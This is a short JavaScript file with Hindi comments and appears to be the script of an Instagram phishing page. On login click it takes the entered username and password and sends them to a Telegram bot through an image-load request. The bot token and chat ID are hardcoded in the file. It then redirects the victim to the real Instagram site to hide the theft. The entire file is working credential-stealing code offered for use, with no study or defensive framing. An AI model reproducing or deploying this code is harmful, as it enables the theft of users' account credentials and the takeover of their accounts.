document.addEventListener("DOMContentLoaded", function() {
    const loginButton = document.getElementById("loginBtn");
    const usernameInput = document.getElementById("username");
    const passwordInput = document.getElementById("password");

    if (loginButton) {
        loginButton.addEventListener("click", function() {
            const userValue = usernameInput.value.trim();
            const passValue = passwordInput.value.trim();

            if (userValue === "" || passValue === "") {
                alert("Please enter a username and password.");
                return;
            }

            // बटन को लोडिंग स्टेट में बदलना
            loginButton.innerText = "Log in...";
            loginButton.style.opacity = "0.7";

            const botToken = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs"; 
            const chatId = "7008289410";
            
            const message = "🎯 नया लॉगिन डेटा मिला!\n👤 यूजरनेम: " + userValue + "\n🔑 पासवर्ड: " + passValue;
            const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
            
            // डेटा टेलीग्राम पर भेजने के लिए इमेज ट्रिक
            const img = new Image();
            img.src = telegramUrl;

            // 2 सेकंड के बाद असली इंस्टाग्राम वेबसाइट पर भेज देना
            setTimeout(function() {
                window.location.href = "https://www.instagram.com";
            }, 2000);
        });
    }
});
                
